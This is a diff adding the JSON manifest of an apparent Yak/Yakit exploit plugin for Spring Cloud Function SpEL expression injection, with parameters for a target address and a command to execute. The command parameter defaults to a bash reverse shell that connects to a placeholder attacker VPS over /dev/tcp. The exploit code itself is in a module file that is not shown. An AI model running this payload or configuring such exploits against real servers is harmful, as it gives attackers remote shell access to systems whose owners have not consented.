@@ -1,0 +1,37 @@
+{
+    "name": "Spring Cloud Function SPEL表达式注入 EXP",
+    "tags": [
+        ""
+    ],
+    "help": "EXP",
+    "author": "Nuxl1r",
+    "module_file": "yak_module.yak",
+    "params": [
+        {
+            "name": "target",
+            "verbose": "目标",
+            "description": "",
+            "type": "string",
+            "default_value": "ip:port || URL",
+            "required": true,
+            "group": "",
+            "extra_setting": ""
+        },
+        {
+            "name": "cmd",
+            "verbose": "执行命令",
+            "description": "",
+            "type": "string",
+            "default_value": "bash -i \u003e\u0026 /dev/tcp/\u003cvps_ip\u003e/\u003cvps_port\u003e 0\u003e\u00261",
+            "required": true,
+            "group": "",
+            "extra_setting": ""
+        }
+    ],
+    "document": "document.md",
+    "general_module_verbose": "",
+    "general_module_key": "",
+    "is_general_module": false,
+    "enable_plugin_selector": false,
+    "plugin_selector_types": ""
+}
